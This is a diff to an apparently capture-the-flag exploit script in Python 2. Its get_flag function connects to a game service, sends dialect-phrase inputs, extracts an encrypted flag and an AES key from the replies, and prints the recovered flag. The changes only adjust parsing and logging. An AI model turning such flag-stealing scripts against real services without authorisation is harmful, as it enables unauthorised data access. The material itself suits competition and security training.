@@ -31,10 +31,10 @@ def get_flag(ip, port, flag_id, token):
 	loop = True
 	while loop:
 	    tmp = s.recv(BUFFER_SIZE)
-	    if tmp.find("Fahrgsteinumma ei:") != -1: 
+	    if tmp.find("Fahrgsteinumma ei:\n") != -1: 
 	        loop = False
 	    data += tmp
-
+	
 	s.send(fzn+"\n")
 	data = ""
 	loop = True
@@ -42,9 +42,10 @@ def get_flag(ip, port, flag_id, token):
 	    tmp = s.recv(BUFFER_SIZE)
     	    if tmp.find("Dei Emissionwert der ist ned so guad schaust ma her:") != -1: 
 	        loop = False
-	data += tmp
+	    data += tmp
+	
 	enc_flag = data.splitlines()[1]
-
+	print OKGREEN + "[+] Found flag part 1: " + enc_flag + ENDC
 	#------------------------------------------------------------------------------#
 
 	s.send("I ko koa bayrisch\n")
@@ -58,6 +59,7 @@ def get_flag(ip, port, flag_id, token):
                 loop = False
         data += tmp
 	aes_key = data[data.find('bedeutet')+9:data.find('in deutsch')-1] + '\n'
+	print OKGREEN + "[+] Found flag part 2: " + aes_key + ENDC
 
 	#entries = data.splitlines()[1].split("ASDASD")[1].split("32343234")
 	#entries.remove(entries[0])
@@ -72,14 +74,12 @@ def get_flag(ip, port, flag_id, token):
 	flag = data.splitlines()[0]
 
         if data.startswith("gcry_cipher_decrypt failed:"):
-            print FAIL + "[-] Found false flag"+ data + ENDC
+            print FAIL + "[-] Found false flag"+ data.split("\n")[0] + ENDC
         else:
-            print OKGREEN + "[+] Possible Flag: " + data + ENDC
+            print OKGREEN + "[+] Possible Flag: " + data.split("\n")[0] + ENDC
 		
 	s.close()
         return { 'FLAG': flag }
-
-
 
 if __name__ == "__main__":
     print get_flag(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4])
